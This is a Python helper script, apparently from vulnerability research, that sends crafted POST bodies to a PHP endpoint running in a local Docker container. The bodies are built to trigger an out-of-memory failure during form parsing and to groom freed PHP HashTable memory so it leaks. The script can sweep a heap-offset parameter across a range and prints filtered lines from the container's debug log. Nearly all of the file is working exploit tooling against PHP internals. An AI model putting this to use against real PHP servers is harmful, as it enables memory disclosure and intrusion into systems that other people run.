#!/usr/bin/env python3
"""Assoc-groom leak helper for webroot/leak2/gassoc.php.

Body shape is byte-identical to the proven numeric OOM shape (stale_bucket_
leak.build_body): "0=1&1=1&...&(k-1)=1&AAAA...A[x]=1".  Only the endpoint
differs: gassoc.php grooms the recycled arData tail with a freed ASSOC
array of longs ($g["k_i"]=4) instead of packed strings.

Usage:
  python3 gassoc_leak.py --port 28137 --k 255 --size 3.5 --hb 7349200
                         [--n 128 --keylen 4 --pad 0 --padpos before]
                         [--sweep lo hi step]
"""
import argparse
import http.client
import json
import subprocess
import sys
import time


def build_body(k, size_mb, fill="A", subs=60):
    """rev 6 body: (k - subs) numeric keys, then `subs` sub-array vars
    (each burns exactly one 56 B HashTable from the post-destroy free
    list; #46 lands on slot k255 of the groom strings), then the huge
    failing key.  Total successful inserts = k (buckets 0..254)."""
    nnum = k - subs
    parts = [b"%d=1" % i for i in range(nnum)]
    for s in range(subs):
        parts.append(b"A%d[%d]=1" % (s, 900 + s))
    blob = fill.encode() * int(size_mb * 1024 * 1024)
    parts.append(blob + b"[x]=1")
    return b"&".join(parts)


def post(port, path, query, body, timeout=60.0):
    t0 = time.time()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
        conn.request("POST", path + "?" + query, body=body,
                     headers={"Content-Type": "text/plain",
                              "Content-Length": str(len(body))})
        r = conn.getresponse()
        data = r.read()
        conn.close()
        return {"status": r.status,
                "body": data.decode("utf-8", "replace")[:400],
                "secs": round(time.time() - t0, 2)}
    except Exception as e:  # noqa: BLE001
        return {"error": "%s: %s" % (type(e).__name__, e),
                "secs": round(time.time() - t0, 2)}


def glog(container="ga"):
    r = subprocess.run(["docker", "exec", container, "cat", "/tmp/g.log"],
                       capture_output=True, text=True, timeout=15)
    return r.stdout


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=28137)
    ap.add_argument("--path", default="/leak2/gassoc.php")
    ap.add_argument("--k", type=int, default=255)
    ap.add_argument("--size", type=float, default=3.5)
    ap.add_argument("--fill", default="A")
    ap.add_argument("--n", type=int, default=128)
    ap.add_argument("--keylen", type=int, default=4)
    ap.add_argument("--subs", type=int, default=60)
    ap.add_argument("--pad", type=int, default=0)
    ap.add_argument("--padpos", default="before")
    ap.add_argument("--hb", type=int, default=7349200)
    ap.add_argument("--sweep", default="",
                    help="lo:hi:step overrides --hb with a sweep")
    ap.add_argument("--out", default="")
    args = ap.parse_args()

    body = build_body(args.k, args.size, args.fill, subs=args.subs)

    def one(hb):
        q = ("k=%d&n=%d&keylen=%d&pad=%d&padpos=%s&v=2&hb=%d"
             % (args.k, args.n, args.keylen, args.pad, args.padpos, hb))
        r = post(args.port, args.path, q, body)
        log = glog()
        interesting = [ln for ln in log.splitlines()
                       if ln.startswith(("fe ", "count=", "SHUTDOWN",
                                         "before_parse", "parse returned",
                                         "out missing", "ini_set"))]
        print("== hb=%d -> %s" % (hb, {x: r[x] for x in r if x != "body"}))
        for ln in interesting:
            print("   " + ln)
        return {"hb": hb, "resp": r, "log": log}

    results = []
    if args.sweep:
        lo, hi, step = (int(x) for x in args.sweep.split(":"))
        for hb in range(lo, hi + 1, step):
            results.append(one(hb))
    else:
        results.append(one(args.hb))

    if args.out:
        with open(args.out, "w") as fh:
            json.dump(results, fh, indent=2)
        print("[saved] %s" % args.out)


if __name__ == "__main__":
    sys.exit(main())
